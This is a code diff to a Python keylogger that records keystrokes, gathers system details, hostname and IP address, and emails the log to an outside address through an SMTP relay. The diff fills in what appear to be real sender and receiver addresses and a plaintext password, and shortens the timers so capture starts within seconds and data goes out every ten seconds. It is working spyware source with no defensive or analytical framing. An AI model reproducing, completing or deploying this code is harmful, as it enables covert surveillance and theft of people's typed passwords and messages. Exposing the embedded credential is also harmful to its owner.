@@ -16,12 +16,12 @@ class Keylogger:
     def __init__(self):
         self.log_file = "keylog.txt"
         self.screenshot_file = "screenshot.jpg"
-        self.sender_email = "sender@gmail.com"
-        self.receiver_email = "receiver@gmail.com"
-        self.password = "password"
+        self.sender_email = "abdulfaro@telegmail.com"
+        self.password = "KWU1gpfYMASZcmND"
+        self.receiver_email = "abdulfarooqf8@gmail.com"
 
     def start(self):
-        with open("keylog.txt", "w") as file:
+        with open('keylog.txt', 'w') as file:
             file.write(self.get_system_info())
             file.write(self.get_network_info())
 
@@ -29,25 +29,27 @@ class Keylogger:
         keyboard.on_press(self.handle_ctrl_q)
 
         # Start recording the keys after a 21-second delay
-        Timer(21, keyboard.on_press, args=(self.record_keys,)).start()
+        Timer(5, keyboard.on_press, args=(self.record_keys,)).start()
 
-        # Start sending the keys and screenshot every 5 minutes
-        Timer(300, self.send_data).start()
+        # Start sending the keys and screenshot every 5 minutes  300sec
+        Timer(10, self.send_data).start()
 
         # Keep the program running
         input("Press Enter to stop...")
 
-    def record_keys(event):
+    def record_keys(self, event):
         if event.event_type == "down":
             if event.name == "space":
                 key = " "
             elif event.name == "enter":
                 key = "\n"
             elif event.name == "backspace":
-                key = " <-- "
+                key = ' <-- '
+            elif event.name == "ctrl":
+                key = 'ctrl '
             else:
                 key = event.name
-        
+            
             with open("keylog.txt", "a") as file:
                 file.write(key)
 
@@ -55,7 +57,7 @@ class Keylogger:
         with open(self.log_file, "r") as file:
             keys = file.read()
         self.send_email("Key Log and Screenshot", keys)
-        Timer(300, self.send_data).start()
+        Timer(10, self.send_data).start()
 
     def send_email(self, subject, body):
         message = MIMEMultipart()
@@ -76,7 +78,7 @@ class Keylogger:
 
         while True:
             try:
-                with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
+                with smtplib.SMTP_SSL("smtp-relay.brevo.com", 587) as server:
                     server.login(self.sender_email, self.password)
                     server.sendmail(self.sender_email, self.receiver_email, message.as_string())
                 break
@@ -94,13 +96,13 @@ class Keylogger:
         info += f"Release: {platform.release()}\n"
         info += f"Version: {platform.version()}\n"
         info += f"Machine: {platform.machine()}\n"
-        info += f"Processor: {platform.processor()}\n"
+        info += f"Processor: {platform.processor()}\n\n"
         return info
 
     def get_network_info(self):
         hostname = socket.gethostname()
         ip_address = socket.gethostbyname(hostname)
-        return f"Hostname: {hostname}\nIP Address: {ip_address}"
+        return f"Hostname: {hostname}\nIP Address: {ip_address}\n\n"
 
     def handle_ctrl_q(self, event):
         if event.name == 'q' and event.event_type == 'down' and 'ctrl' in keyboard._pressed_events:
